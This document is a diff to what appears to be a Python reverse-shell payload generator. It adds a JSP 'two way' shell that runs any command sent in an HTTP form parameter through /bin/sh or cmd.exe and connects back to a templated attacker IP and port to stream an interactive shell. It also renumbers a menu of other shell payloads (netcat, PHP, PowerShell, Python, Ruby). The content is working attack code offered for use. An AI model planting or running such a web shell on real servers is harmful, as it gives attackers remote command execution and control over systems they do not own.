@@ -81,6 +81,108 @@ if(ipAddress != null && ipPort != null)
         catch(Exception e) 
 }
 %>'''
+
+
+    java_two_way = '''
+<%
+    /*
+     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
+     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
+     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
+     * the command specified in the HTML form). This is to avoid to keep it simple.
+     */
+%>
+
+<%@page import="java.lang.*"%>
+<%@page import="java.io.*"%>
+<%@page import="java.net.*"%>
+<%@page import="java.util.*"%>
+
+<html>
+<head>
+    <title>jrshell</title>
+</head>
+<body>
+<form METHOD="POST" NAME="myform" ACTION="">
+    <input TYPE="text" NAME="shell">
+    <input TYPE="submit" VALUE="Send">
+</form>
+<pre>
+<%
+    // Define the OS
+    String shellPath = null;
+    try
+    {
+        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+            shellPath = new String("/bin/sh");
+        } else {
+            shellPath = new String("cmd.exe");
+        }
+    } catch( Exception e ){}
+    // INNER HTML PART
+    if (request.getParameter("shell") != null) {
+        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
+        Process p;
+        if (shellPath.equals("cmd.exe"))
+            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
+        else
+            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+            out.println(disr);
+            disr = dis.readLine();
+        }
+    }
+    // TCP PORT PART
+    class StreamConnector extends Thread
+    {
+        InputStream wz;
+        OutputStream yr;
+        StreamConnector( InputStream wz, OutputStream yr ) {
+            this.wz = wz;
+            this.yr = yr;
+        }
+        public void run()
+        {
+            BufferedReader r  = null;
+            BufferedWriter w = null;
+            try
+            {
+                r  = new BufferedReader(new InputStreamReader(wz));
+                w = new BufferedWriter(new OutputStreamWriter(yr));
+                char buffer[] = new char[8192];
+                int length;
+                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
+                {
+                    w.write( buffer, 0, length );
+                    w.flush();
+                }
+            } catch( Exception e ){}
+            try
+            {
+                if( r != null )
+                    r.close();
+                if( w != null )
+                    w.close();
+            } catch( Exception e ){}
+        }
+    }
+ 
+    try {
+        Socket socket = new Socket( "'''+ip+'''", '''+port+''' ); // Replace with wanted ip and port
+        Process process = Runtime.getRuntime().exec( shellPath );
+        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
+        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
+        out.println("port opened on " + socket);
+     } catch( Exception e ) {}
+%>
+</pre>
+</body>
+</html>'''
+    
     javascript = '''
 String command = "var host = \''''+ip+'''\';" +
                        "var port = '''+port+''';" +
@@ -238,70 +340,72 @@ except KeyboardInterrupt:
     if num == 22:
         return java_web
     elif num == 23:
-        return javascript
+        return java_two_way
     elif num == 24:
-        return lua_1
+        return javascript
     elif num == 25:
-        return lua_2
+        return lua_1
     elif num == 26:
-        return nc_c
+        return lua_2
     elif num == 27:
-        return nc_e
+        return nc_c
     elif num == 28:
-        return nc_mkfifo
+        return nc_e
     elif num == 29:
-        return nc_exe
+        return nc_mkfifo
     elif num == 30:
-        return ncat_exe
+        return nc_exe
     elif num == 31:
-        return ncat_udp
+        return ncat_exe
     elif num == 32:
-        return node_js_1
+        return ncat_udp
     elif num == 33:
-        return node_js_2
+        return node_js_1
     elif num == 34:
-        return perl
+        return node_js_2
     elif num == 35:
-        return perl_sh
+        return perl
     elif num == 36:
-        return php_cmd_1
+        return perl_sh
     elif num == 37:
-        return php_cmd_2
+        return php_cmd_1
     elif num == 38:
-        return php_cmd_small
+        return php_cmd_2
     elif num == 39:
-        return php_cmd_exec
+        return php_cmd_small
     elif num == 40:
-        return php_passthru
+        return php_cmd_exec
     elif num == 41:
-        return php_popen
+        return php_passthru
     elif num == 42:
-        return php_proc_open
+        return php_popen
     elif num == 43:
-        return php_shell_exec
+        return php_proc_open
     elif num == 44:
-        return powershell_1
+        return php_shell_exec
     elif num == 45:
-        return powershell_2
+        return powershell_1
     elif num == 46:
-        return powershell_3
+        return powershell_2
     elif num == 47:
-        return powershell_4
+        return powershell_3
     elif num == 48:
-        return python_1
+        return powershell_4
     elif num == 49:
-        return python_2
+        return python_1
     elif num == 50:
-        return python3_1
+        return python_2
     elif num == 51:
-        return python3_2
+        return python3_1
     elif num == 52:
-        return python3_short
+        return python3_2
     elif num == 53:
-        return python3_windows
+        return python3_short
     elif num == 54:
-        return ruby
+        return python3_windows
     elif num == 55:
+        return ruby
+    elif num == 56:
         return ruby_no_sh
     else:
         return 0
